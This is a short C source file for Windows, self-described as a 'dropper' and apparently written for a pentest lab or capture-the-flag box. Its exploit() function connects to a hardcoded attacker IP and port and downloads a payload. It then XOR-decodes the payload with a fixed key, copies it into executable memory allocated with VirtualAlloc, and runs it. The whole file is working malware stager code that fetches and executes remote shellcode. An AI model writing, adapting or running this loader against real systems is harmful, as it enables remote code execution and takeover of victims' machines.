#include <winsock2.h>

//gcc -o dropper dropper.c -lwsock32

#define BUFFER_SIZE 1024

void exploit()
{
    int port = 9002;
    char ip[] = "10.10.10.10"; //attacker_IP

    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    serv_addr.sin_addr.s_addr = inet_addr(ip); //windows

    int n = connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

    unsigned char buffer[BUFFER_SIZE];
    n = recv(sockfd, buffer, BUFFER_SIZE, 0);
    
    closesocket(sockfd);
    WSACleanup();
    char key[] = "YoloSpaceHacker";
    unsigned char shellcode[n];

    for (int i = 0; i < n; i++)
    {
        //printf("%02x", buffer[i]);
        shellcode[i] = buffer[i] ^ key[i % strlen(key)];
    }

    void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    ((void(*)())exec)();

}


int main()
{
    exploit();
    return 0;
}

